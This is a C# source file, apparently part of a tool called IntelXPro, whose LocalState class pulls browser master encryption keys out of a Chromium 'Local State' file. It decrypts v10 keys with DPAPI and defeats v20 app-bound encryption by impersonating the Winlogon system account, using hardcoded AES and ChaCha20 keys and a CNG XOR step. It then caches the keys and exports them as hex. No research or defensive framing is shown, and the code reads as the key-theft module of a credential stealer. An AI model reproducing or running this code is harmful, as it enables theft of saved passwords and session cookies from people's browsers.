using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

using IntelXPro.src.IntelXPro.Dependencies.General;

namespace IntelXPro.src.IntelXPro.Dependencies.Encryption
{
    public static class LocalState
    {
        private static readonly ConcurrentDictionary<string, Lazy<byte[]>> _masterKeyCacheV10 = new ConcurrentDictionary<string, Lazy<byte[]>>();

        private static readonly ConcurrentDictionary<string, Lazy<byte[]>> _masterKeyCacheV20 = new ConcurrentDictionary<string, Lazy<byte[]>>();

        private static readonly ConcurrentDictionary<string, SemaphoreSlim> _locks = new ConcurrentDictionary<string, SemaphoreSlim>();

        public static List<string[]> GetMasterKeys()
        {
            List<string[]> list = new List<string[]>();
            foreach (KeyValuePair<string, Lazy<byte[]>> item in _masterKeyCacheV10)
            {
                try
                {
                    string text = item.Key ?? "";
                    Lazy<byte[]> value = item.Value;
                    if (value == null)
                    {
                        continue;
                    }
                    byte[] value2 = value.Value;
                    if (value2 != null)
                    {
                        StringBuilder stringBuilder = new StringBuilder(value2.Length * 2);
                        byte[] array = value2;
                        foreach (byte b in array)
                        {
                            stringBuilder.Append(b.ToString("X2"));
                        }
                        list.Add(new string[3]
                        {
                        text,
                        "v10",
                        stringBuilder.ToString()
                        });
                    }
                }
                catch
                {
                }
            }
            foreach (KeyValuePair<string, Lazy<byte[]>> item2 in _masterKeyCacheV20)
            {
                try
                {
                    string text2 = item2.Key ?? "";
                    Lazy<byte[]> value3 = item2.Value;
                    if (value3 == null)
                    {
                        continue;
                    }
                    byte[] value4 = value3.Value;
                    if (value4 != null)
                    {
                        StringBuilder stringBuilder2 = new StringBuilder(value4.Length * 2);
                        byte[] array = value4;
                        foreach (byte b2 in array)
                        {
                            stringBuilder2.Append(b2.ToString("X2"));
                        }
                        list.Add(new string[3]
                        {
                        text2,
                        "v20",
                        stringBuilder2.ToString()
                        });
                    }
                }
                catch
                {
                }
            }
            return list;
        }

        public static byte[] MasterKeyV20(string localstate)
        {
            SemaphoreSlim orAdd = _locks.GetOrAdd(localstate, (string _) => new SemaphoreSlim(1, 1));
            orAdd.Wait();
            try
            {
                if (_masterKeyCacheV20.TryGetValue(localstate, out var value))
                {
                    return value.Value;
                }
                Lazy<byte[]> lazy = new Lazy<byte[]>(() => ComputeMasterKeyV20(localstate));
                _masterKeyCacheV20[localstate] = lazy;
                return lazy.Value;
            }
            finally
            {
                orAdd.Release();
            }
        }

        private static byte[] ComputeMasterKeyV20(string localstate)
        {
            try
            {
                Match match = Regex.Match(LocalStateContent(localstate), "\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
                if (!match.Success)
                {
                    return null;
                }
                BlobParsedData blobParsedData = ParseKeyBlob.Parse(DecryptAsSystemUser(Convert.FromBase64String(match.Groups[1].Value).Skip(4).ToArray()));
                switch (blobParsedData.Flag)
                {
                    case 1:
                        return AesGcm256.Decrypt(new byte[32]
                        {
                    179, 28, 110, 36, 26, 200, 70, 114, 141, 169,
                    193, 250, 196, 147, 102, 81, 207, 251, 148, 77,
                    20, 58, 184, 22, 39, 107, 204, 109, 160, 40,
                    71, 135
                        }, blobParsedData.Iv, null, blobParsedData.Ciphertext, blobParsedData.Tag);
                    case 2:
                        return ChaCha20Poly1305.Decrypt(new byte[32]
                        {
                    233, 143, 55, 215, 244, 225, 250, 67, 61, 25,
                    48, 77, 194, 37, 128, 66, 9, 14, 45, 29,
                    126, 234, 118, 112, 212, 31, 115, 141, 8, 114,
                    150, 96
                        }, blobParsedData.Iv, blobParsedData.Ciphertext, blobParsedData.Tag);
                    case 3:
                        {
                            byte[] array = new byte[32]
                            {
                    204, 248, 161, 206, 197, 102, 5, 184, 81, 117,
                    82, 186, 26, 45, 6, 28, 3, 162, 158, 144,
                    39, 79, 178, 252, 245, 155, 164, 183, 92, 57,
                    35, 144
                            };
                            byte[] array2 = CDecryptor(blobParsedData.EncryptedAesKey);
                            for (int i = 0; i < array2.Length; i++)
                            {
                                array2[i] ^= array[i];
                            }
                            return AesGcm256.Decrypt(array2, blobParsedData.Iv, null, blobParsedData.Ciphertext, blobParsedData.Tag);
                        }
                    case 32:
                        return blobParsedData.EncryptedAesKey;
                    default:
                        return null;
                }
            }
            catch
            {
                return null;
            }
        }

        public static byte[] MasterKeyV10(string localstate)
        {
            SemaphoreSlim orAdd = _locks.GetOrAdd(localstate, (string _) => new SemaphoreSlim(1, 1));
            orAdd.Wait();
            try
            {
                if (_masterKeyCacheV10.TryGetValue(localstate, out var value))
                {
                    return value.Value;
                }
                Lazy<byte[]> lazy = new Lazy<byte[]>(() => ComputeMasterKeyV10(localstate));
                _masterKeyCacheV10[localstate] = lazy;
                return lazy.Value;
            }
            finally
            {
                orAdd.Release();
            }
        }

        private static byte[] ComputeMasterKeyV10(string localstate)
        {
            try
            {
                Match match = Regex.Match(LocalStateContent(localstate), "\"encrypted_key\":\"(.*?)\"");
                if (!match.Success)
                {
                    return null;
                }
                return DpApi.Decrypt(Convert.FromBase64String(match.Groups[1].Value).Skip(5).ToArray());
            }
            catch
            {
                return null;
            }
        }

        private static byte[] CDecryptor(byte[] encryptedData)
        {
            using (ImpersonationHelper.ImpersonateWinlogon())
            {
                return CngDecryptor.Decrypt(encryptedData);
            }
        }

        private static byte[] DecryptAsSystemUser(byte[] encryptedData)
        {
            using (ImpersonationHelper.ImpersonateWinlogon())
            {
                encryptedData = DpApi.Decrypt(encryptedData);
            }
            return DpApi.Decrypt(encryptedData);
        }

        private static string LocalStateContent(string localstate)
        {
            string text = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
            File.Copy(localstate, text, overwrite: true);
            string result = File.ReadAllText(text);
            File.Delete(text);
            return result;
        }
    }
}
